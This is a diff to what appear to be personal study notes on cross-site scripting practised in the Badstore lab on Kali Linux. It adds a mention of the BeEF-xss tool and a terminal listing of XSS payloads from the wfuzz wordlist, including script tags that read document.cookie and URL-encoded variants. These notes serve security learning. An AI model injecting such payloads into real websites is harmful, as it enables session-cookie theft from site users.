@@ -59,8 +59,22 @@ The most common special characters used for purpose include; `< > ' " { } ;` as 
 
 This is like former when practices/demonstrate within Badstore (small repeat) what this XSS is meaning and although of course there is other tools practices with Kali Linux, not just Badstore.
 
-On kali linux xss tool like <b>Beef-xss</b>
+On kali linux xss tool like <b>Beef-xss</b> or just add some input field give a small script and this can found on linux path `/usr/share/wordlists/wfuzz/Injections`
 
+```
+┌──(kali㉿kali)-[/usr/share/wordlists/wfuzz/Injections]
+└─$ head XSS.txt 
+"><script>"
+<script>alert("WXSS")</script>
+<<script>alert("WXSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
 
+```
 
 
